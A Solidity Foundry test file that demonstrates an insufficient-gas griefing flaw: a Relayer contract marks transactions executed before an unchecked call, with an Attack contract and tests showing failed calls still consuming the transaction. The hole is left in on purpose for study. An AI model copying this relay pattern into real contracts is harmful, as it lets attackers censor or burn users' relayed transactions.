// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

/*
  Vulnerable contracts from 3.1-Improper-Gas-Requirements-Checking-vulnerability.sol
*/

contract Relayer {
    uint public transactionId;  // records number of transactions

    struct Tx {
        bytes data;
        bool executed;
    }

    mapping(uint => Tx) public transactions;

    // Vulnerability: relay does not check if provided gas is sufficient for executing target.
    function relay(address target, bytes memory _data) public returns (bool) {
        // Prevent replay attacks
        require(!transactions[transactionId].executed, "Same transaction twice");
        transactions[transactionId].data = _data;
        transactions[transactionId].executed = true;
        transactionId += 1;

        // Calls target.execute and does not control or check the gas forwarded properly
        (bool success, ) = target.call(abi.encodeWithSignature("execute(bytes)", _data));
        return success;
    }
}

contract Target {
    // Vulnerability: heavy computation without checking gas
    function execute(bytes memory /* _data */) public {
        uint sum = 0;
        // Simulate heavy computation
        for (uint i = 0; i < 100000; i++) {
            sum += i;
        }
        // Further logic...
    }
}

contract Attack {
    Relayer public relayer;
    Target public target;

    // Deploy with addresses for Relayer and Target
    constructor(address _relayer, address _target) {
        relayer = Relayer(_relayer);
        target = Target(_target);
    }

    // Attack function: triggers heavy computation via relay
    function attack() public {
        bytes memory data = "";
        relayer.relay(address(target), data);
    }
}


contract ImproperGasRequirementsTest is Test {
    Relayer public relayer;
    Target public target;
    Attack public attack;

    function setUp() public {
        relayer = new Relayer();
        target = new Target();
        attack = new Attack(address(relayer), address(target));
    }

    // Test relay call with low gas - expecting the call to fail due to out-of-gas in heavy computation
    function testRelayWithLowGas() public {
        // Provide low gas so that the heavy computation in Target.execute runs out-of-gas
        bool result = relayer.relay{gas: 200000}(address(target), "");
        // Expect false as the call should fail due to out-of-gas
        assertTrue(result == false, "Relay should fail due to out-of-gas in heavy computation");

        // Even if execution fails, transaction is marked as executed and transactionId advanced
        (, bool executed) = relayer.transactions(0);
        assertTrue(executed, "The transaction should be marked as executed even if execution failed");
        assertEq(relayer.transactionId(), 1, "Transaction ID should advance even if execution fails");
    }

    // Test relay call with high gas - expecting the call to succeed if sufficient gas is provided
    function testRelayWithSufficientGas() public {
        // Provide a high gas limit to allow Target.execute to complete its heavy computation
        bool result = relayer.relay{gas: 50000000}(address(target), "");
        // According to vulnerability: if gas is sufficient, the call should succeed
        assertTrue(result, "Relay should succeed with sufficient gas");

        (, bool executed) = relayer.transactions(0);
        assertTrue(executed, "The transaction should be marked as executed");
        assertEq(relayer.transactionId(), 1, "Transaction ID should be incremented after execution");
    }

    // Test the Attack contract calling attack() with low gas
    function testAttackWithLowGas() public {
        // Calling Attack.attack with low gas - it internally calls relayer.relay
        // We expect the relay call to fail (return false) due to out-of-gas
        vm.prank(address(this));
        attack.attack{gas: 200000}();

        (, bool executed) = relayer.transactions(0);
        assertTrue(executed, "The transaction should be marked as executed after attack invocation");
        assertEq(relayer.transactionId(), 1, "Transaction ID should advance after attack invocation");
    }

    // Test the Attack contract calling attack() with sufficient gas
    function testAttackWithSufficientGas() public {
        // Calling Attack.attack with high gas - expecting successful execution
        vm.prank(address(this));
        attack.attack{gas: 50000000}();

        (, bool executed) = relayer.transactions(0);
        assertTrue(executed, "The transaction should be marked as executed after attack invocation");
        assertEq(relayer.transactionId(), 1, "Transaction ID should be incremented after attack invocation");
    }
}
